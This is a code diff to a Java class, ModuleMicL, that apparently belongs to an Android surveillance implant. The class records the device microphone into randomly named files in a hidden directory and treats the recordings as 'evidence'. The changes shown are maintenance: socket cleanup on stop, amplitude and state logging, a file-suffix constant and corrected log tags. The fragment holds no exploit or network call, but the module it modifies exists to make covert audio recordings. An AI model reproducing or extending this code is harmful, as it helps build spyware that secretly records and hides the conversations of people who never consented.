@@ -41,6 +41,7 @@ public class ModuleMicL extends ModuleMic {
 
 	void specificStop() {
 		stopRecorder();
+		deleteSockets();
 		recorder = null;
 	}
 
@@ -48,6 +49,7 @@ public class ModuleMicL extends ModuleMic {
 
 		if (numFailures > MAX_NUM_OF_FAILURE) {
 			stopRecorder();
+			deleteSockets();
 			recorder = null;
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "numFailures: " + numFailures);//$NON-NLS-1$
@@ -134,6 +136,11 @@ public class ModuleMicL extends ModuleMic {
 
 			recorder.prepare();
 			recorder.start(); // Recording is now started
+			int ampl = recorder.getMaxAmplitude();
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (specificStart) recorder started ampl" + ampl);//$NON-NLS-1$
+			}
+			recorder_started = true;
 		} catch (Exception e) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (specificStart) another apps may be blocking recording: " + e);//$NON-NLS-1$
@@ -151,7 +158,7 @@ public class ModuleMicL extends ModuleMic {
 
 	private void createSockets() {
 		if (out_file == null) {
-			out_file = new AutoFile(Path.hidden(), Utils.getRandom() + ".a");
+			out_file = new AutoFile(Path.hidden(), Utils.getRandom() + ModuleMic.MIC_SUFFIX);
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (createSocket) new file: " + out_file.getFile());//$NON-NLS-1$
 			}
@@ -189,13 +196,13 @@ public class ModuleMicL extends ModuleMic {
 					Check.log(ex);
 				}
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (saveRecorderEvidence) resetting recorder");
+					Check.log(TAG + " (stopRecorder) resetting recorder");
 					recorder = null;
 				}
 			}
 			if (out_file == null || !out_file.exists()) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (saveRecorderEvidence) Error: out_file not available");
+					Check.log(TAG + " (stopRecorder) Error: out_file not available");
 
 				}
 				numFailures += 1;
@@ -214,7 +221,11 @@ public class ModuleMicL extends ModuleMic {
 		deleteSockets();
 		if(recorder !=null) {
 			recorder.release();
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (specificSuspend): released");
+			}
 		}
+		recorder_started = false;
 		recorder=null;
 	}
 
